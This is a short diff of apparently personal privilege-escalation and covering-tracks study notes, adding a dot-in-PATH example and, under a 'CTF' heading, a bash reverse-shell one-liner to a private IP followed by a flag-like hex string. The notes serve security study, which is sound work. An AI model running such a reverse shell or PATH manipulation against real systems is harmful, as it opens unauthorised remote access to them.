@@ -54,17 +54,7 @@ auditpol /get /category:* | findstr /i "success failure"
   - * `find / -type d -perm /2 -ls 2>/dev/null`
 * Dot '.' in PATH
   - Lets you execute commands that are in your present working directory
-#### Vulnerable Software and Services
-#### Unpatched Kernel Vulnerabilities
-## Persistence
-#### User Account Demo
-```
-
-```
-### Cron Persistence Demo
-```
-
-```
+  - `export PATH=".:$PATH"`
 ## Covering Your Tracks
 #### Artifacts
 * Things that we leave behind in a system
@@ -115,8 +105,9 @@ cron.!info,!debug
 # CTF
 ```
 watch -n1 'ls -l'
+/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
 ```
-
+5feff04460d67d0139719503e72c8054
 
 
 
